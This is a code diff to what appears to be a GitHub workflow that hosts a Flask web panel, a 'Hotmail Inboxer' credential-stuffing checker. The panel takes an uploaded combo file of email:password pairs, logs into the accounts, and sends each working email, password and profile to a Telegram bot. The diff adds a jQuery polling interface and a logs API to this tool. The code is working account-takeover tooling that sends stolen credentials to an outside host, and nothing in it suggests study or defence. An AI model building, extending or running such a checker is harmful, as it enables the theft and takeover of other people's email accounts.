@@ -73,7 +73,7 @@ jobs:
                   try:
                       dursunburasi = '\n'.join(f'• {k}: {v}' for k, v in captures.items())
                       fadimeoc = '\n'.join(f'✅ {svc} ({data["total"]} mesaj) — {data["last_msg"][:50]}' for svc, data in results.items())
-                      kombinzaradan = f'🔱 <b>HIT BULUNDU</b>\n\n🔱 <b>Email:</b> <code>{email}</code>\n🔱 <b>Şifre:</b> <code>{password}</code>\n\n🔱 <b>Profil:</b>\n{dursunburasi}\n\n🔱 <b>Servisler:</b>\n{fadimeoc}\n\n⚊⚊⚊⚊⚊⚊⚊⚊⚋⚊⚊⚊⚊⚊\n<b>PROGRAM :</b> @octopusmarjinal'
+                      kombinzaradan = f'🔱 <b>HIT BULUNDU</b>\n\n🔱 <b>Email:</b> <code>{email}</code>\n🔱 <b>Şifre:</b> <code>{password}</code>\n\n🔱 <b>Profil:</b>\n{dursunburasi}\n\n🔱 <b>Servisler:</b>\n{fadimeoc}\n\n⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚋⚊⚊\n<b>PROGRAM :</b> @octopusmarjinal'
                       requests.post(f'{self.temelburasi}/sendMessage', json={'chat_id': self.chat_id, 'text': kombinzaradan, 'parse_mode': 'HTML', 'disable_web_page_preview': True}, timeout=15)
                   except Exception: pass
 
@@ -357,6 +357,7 @@ jobs:
           <html>
           <head>
               <title>Hotmail Inboxer Panel</title>
+              <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
               <style>
                   body { font-family: Arial, sans-serif; background-color: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }
                   .container { max-width: 800px; margin: auto; background: #161b22; padding: 20px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
@@ -372,12 +373,11 @@ jobs:
                   .download-links { margin-top: 20px; text-align: center; }
                   .download-links a { color: #58a6ff; text-decoration: none; margin: 0 10px; font-weight: bold; }
               </style>
-              <meta http-equiv='refresh' content='3'>
           </head>
           <body>
               <div class='container'>
                   <h1>🔥 Hotmail Inboxer Panel</h1>
-                  <form method='POST' enctype='multipart/form-data'>
+                  <form id='uploadForm' enctype='multipart/form-data'>
                       <div class='form-group'>
                           <label>Telegram Bot Token (Optional)</label>
                           <input type='text' name='token' placeholder='123456:ABCDEF...' value='{{ token }}'>
@@ -390,26 +390,76 @@ jobs:
                           <label>Combo File (.txt)</label>
                           <input type='file' name='file' accept='.txt' required>
                       </div>
-                      <input type='submit' value='Start Checking' {{ 'disabled' if status == 'running' else '' }}>
+                      <input type='submit' value='Start Checking' id='submitBtn'>
                   </form>
+                  
                   <div class='stats'>
-                      <strong>Status:</strong> <span style='color: {% if status == 'running' %}#3fb950{% else %}#8b949e{% endif %};'>{{ status|upper }}</span>
+                      <strong>Status:</strong> <span id='statusText' style='color: #8b949e;'>IDLE</span>
                       <br><br>
-                      <strong>Total:</strong> {{ stats.total }} &nbsp;|&nbsp; 
-                      <strong class='hit'>Hits:</strong> {{ stats.hits }} &nbsp;|&nbsp; 
-                      <strong class='free'>Free:</strong> {{ stats.free }} &nbsp;|&nbsp; 
-                      <strong class='retry'>Bad/Retries:</strong> {{ stats.bad }}
+                      <strong>Total:</strong> <span id='statTotal'>0</span> &nbsp;|&nbsp; 
+                      <strong class='hit'>Hits:</strong> <span id='statHits'>0</span> &nbsp;|&nbsp; 
+                      <strong class='free'>Free:</strong> <span id='statFree'>0</span> &nbsp;|&nbsp; 
+                      <strong class='retry'>Bad/Retries:</strong> <span id='statBad'>0</span>
                   </div>
-                  <div class='log-box'>
-                  {% for log in logs %}
-                      <div class='{% if 'HIT' in log %}hit{% elif 'FREE' in log %}free{% else %}retry{% endif %}'>{{ log }}</div>
-                  {% endfor %}
-                  </div>
-                  <div class='download-links'>
-                      {% if has_hits %}<a href='/download/hits'>⬇ Download Hits</a>{% endif %}
-                      {% if has_free %}<a href='/download/free'>⬇ Download Free</a>{% endif %}
+
+                  <div class='log-box' id='logBox'></div>
+
+                  <div class='download-links' id='downloadLinks'>
                   </div>
               </div>
+
+              <script>
+                  $(document).ready(function() {
+                      $('#uploadForm').on('submit', function(e) {
+                          e.preventDefault();
+                          var formData = new FormData(this);
+                          $('#submitBtn').prop('disabled', true).val('Starting...');
+                          $.ajax({
+                              url: '/',
+                              type: 'POST',
+                              data: formData,
+                              processData: false,
+                              contentType: false,
+                              success: function(response) {
+                                  $('#submitBtn').val('Process Started Successfully');
+                                  $('#statusText').text('RUNNING').css('color', '#3fb950');
+                              },
+                              error: function() {
+                                  $('#submitBtn').prop('disabled', false).val('Start Checking');
+                              }
+                          });
+                      });
+
+                      setInterval(function() {
+                          $.get('/api/logs', function(data) {
+                              var logBox = $('#logBox');
+                              logBox.empty();
+                              for (var i = 0; i < data.logs.length; i++) {
+                                  var log = data.logs[i];
+                                  var cls = 'retry';
+                                  if (log.includes('[HIT]')) cls = 'hit';
+                                  else if (log.includes('[FREE]')) cls = 'free';
+                                  logBox.append('<div class="' + cls + '">' + log + '</div>');
+                              }
+                              logBox.scrollTop(logBox[0].scrollHeight);
+
+                              $('#statTotal').text(data.stats.total);
+                              $('#statHits').text(data.stats.hits);
+                              $('#statFree').text(data.stats.free);
+                              $('#statBad').text(data.stats.bad);
+
+                              if (data.status === 'finished') {
+                                  $('#statusText').text('FINISHED').css('color', '#d29922');
+                              }
+
+                              var links = '';
+                              if (data.has_hits) links += "<a href='/download/hits'>⬇ Download Hits</a>";
+                              if (data.has_free) links += "<a href='/download/free'>⬇ Download Free</a>";
+                              $('#downloadLinks').html(links);
+                          });
+                      }, 2000);
+                  });
+              </script>
           </body>
           </html>
           '''
@@ -446,9 +496,6 @@ jobs:
                               for t in threads: t.join()
                               active_task['status'] = 'finished'
                           threading.Thread(target=worker_wrapper, daemon=True).start()
-              while not log_queue.empty():
-                  log_messages.append(log_queue.get())
-              if len(log_messages) > 100: log_messages = log_messages[-100:]
               st = active_task['stats'] if active_task['stats'] else elhamdulillah()
               return render_template_string(HTML_TEMPLATE, 
                   status=active_task['status'], 
@@ -459,6 +506,21 @@ jobs:
                   has_hits=os.path.exists('octohotmail.txt'),
                   has_free=os.path.exists('octofree.txt')
               )
+
+          @app.route('/api/logs')
+          def api_logs():
+              global log_messages
+              while not log_queue.empty():
+                  log_messages.append(log_queue.get())
+              if len(log_messages) > 100: log_messages = log_messages[-100:]
+              st = active_task['stats'] if active_task['stats'] else elhamdulillah()
+              return {
+                  'status': active_task['status'],
+                  'stats': {'total': st.total, 'hits': st.bababualemdeteek, 'free': st.zencipuruna, 'bad': st.saxsko + st.mahsummmedet},
+                  'logs': log_messages,
+                  'has_hits': os.path.exists('octohotmail.txt'),
+                  'has_free': os.path.exists('octofree.txt')
+              }
 
           @app.route('/download/<ftype>')
           def download(ftype):
